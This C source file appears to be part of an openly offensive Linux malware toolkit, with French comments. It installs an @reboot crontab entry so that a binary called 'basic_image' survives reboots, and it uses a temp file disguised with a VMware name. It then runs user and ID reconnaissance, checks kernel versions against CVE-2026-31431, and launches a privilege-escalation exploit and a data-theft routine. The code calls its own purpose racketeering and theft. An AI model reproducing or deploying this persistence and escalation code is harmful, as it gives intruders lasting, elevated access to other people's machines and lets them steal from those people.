#ifndef test
#define test
#include <stdio.h>
#include "2_header.h"
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <sys/stat.h>

#define BLACK       "\033[30m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define WHITE       "\033[37m"
#define RESET       "\033[0m"


int petit_persistance(void)
{
    printf(""CYAN"Processus de persistance avant vol demarre avec privileges faibles\n"RESET"");
    //chaque demarage il execute le recket "faible" qui racket demande root reracket
    char path_to_racket_du_loser[512];
    char cron_command[1024];
    if (realpath("basic_image",path_to_racket_du_loser) != NULL)
    {
        printf(""CYAN"Chemin de l'elf racket du noob : "RESET""RED"%s\n\n"RESET"",path_to_racket_du_loser);
        chmod(path_to_racket_du_loser, 0755);
        system("crontab -l > /tmp/vmware-555474 2>/dev/null");
        FILE *flux = fopen("/tmp/vmware-555474", "a");
        if (flux == NULL) {
            printf(""RED"\n\nErreur d ouverture du fichier crontab on pass au vol sans etre persistant\n\n"RESET"");
            system("./basic_image");
        }
        snprintf(cron_command,sizeof(cron_command), "@reboot %s\n",path_to_racket_du_loser);
        fputs(cron_command,flux);
        fclose(flux);
        int cron = system("crontab /tmp/vmware-555474");
        if (cron != 0) {
            printf(""RED"Echec de la mise a jour de la evil crontab ! on pass au vol sans etre persistant\n\n"RESET"");
            system("rm -f /tmp/vmware-555474");
            system("./basic_image");
        }
        system("rm -f /tmp/vmware-555474");
        printf(""GREEN"ON EST ETABLIE POUR LONGTEMPS AVEC DES PRIVILEGE"RESET""RED" FAIBLE "RESET"\n\n");
        petit_vol();

    }




    return 0;
}






int i = 0;




int privesc_faille_rec(void)
{

    if(i == 0)
    {
        printf(""MAGENTA"PROCESSUS DE RECONNAISSANCE DE PRIVESC VIA FAILLE ENCLENCHE!!!\n\n"RESET"");
        //apres rec check et renvoi a ppersistance si succes puis vol
        i = 1;
        // reconnaissance passive 
        printf(YELLOW"User actuellement connectes a la machine:\n"RESET);
        printf(BLUE"\n"RESET);
        system("ps au");

        printf(YELLOW"\n\nID Courant de l'utilisateur\n"RESET);//reco donc pas root lol
        printf(CYAN"\n"RESET);
        system("id");
        printf("\n\n");


        printf(""CYAN"Reconnaissance"RESET" "RED" CVE-2026-31431"RESET);
        printf(CYAN"\n\n"RESET);

        struct utsname kernel;
        if (uname(&kernel) != 0)
        {
            printf(""RED"Erreur lors de la recuperation de la version kernel\n"RESET"");
            indelogable();
            return 1;
        }
        else
        {
            printf(""CYAN"Version du noyau : "RESET""RED"%s\n\n"RESET"",kernel.release);
        }

        int premier_nb = 0,deuxieme_nb = 0,troisieme_nb = 0;
        sscanf(kernel.release,"%d.%d.%d",&premier_nb,&deuxieme_nb,&troisieme_nb);
        int vulnerable = 0;
    
        
        if (premier_nb < 4 || (premier_nb == 4 && deuxieme_nb < 14)) {
            
            vulnerable = 0; //0
        } 
        else if (premier_nb == 4 || premier_nb == 5 || (premier_nb == 6 && deuxieme_nb <= 18)) {
        
            vulnerable = 1;
        } 
        else if (premier_nb == 6 && deuxieme_nb == 19) {
            
            if (troisieme_nb <= 11) {
                vulnerable = 1;
            } else {
                vulnerable = 0; //0
            }
        } 
        else {
            
            vulnerable = 0;//0
        } 

        if(vulnerable)
        {
            printf(""MAGENTA"\nKERNEL SEMBLE VULNERABLE JE LANCE L'EXPLOIT\n\n"RESET"");
            petit_persistance();//on sais jamais
            copy_fail();
            //fichier 7 code de l exploit
            //qui appelera en fonction petit persistance ou grande avec grand vol
        }
        else
        {
            printf(""RED"BAH PAS DE CHANCE ON A JUSTE UN ACCES USER\n\n"RESET"");
            petit_persistance();

        }
    
        
    }



    return 0;
}


#endif